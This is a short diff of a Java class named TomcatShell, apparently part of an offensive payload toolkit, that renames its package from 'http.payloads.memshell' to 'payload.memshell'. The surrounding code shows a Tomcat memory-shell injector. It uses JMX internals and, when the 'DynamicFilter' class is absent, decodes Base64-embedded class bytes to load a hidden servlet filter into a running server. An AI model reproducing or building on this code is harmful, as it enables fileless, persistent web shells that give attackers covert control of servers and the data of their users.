@@ -1,4 +1,4 @@
-package http.payloads.memshell;
+package payload.memshell;
 
 import com.sun.jmx.mbeanserver.NamedObject;
 import com.sun.jmx.mbeanserver.Repository;
@@ -73,7 +73,7 @@ public class TomcatShell {
                     ClassLoader cl = Thread.currentThread().getContextClassLoader();
                     Class<?> clazz;
                     try {
-                        clazz = cl.loadClass("http.payloads.memshell.DynamicFilter");
+                        clazz = cl.loadClass("payload.memshell.DynamicFilter");
                     } catch (ClassNotFoundException e) {
                         byte[] bytes = Base64.getDecoder().decode(filterCode);
 
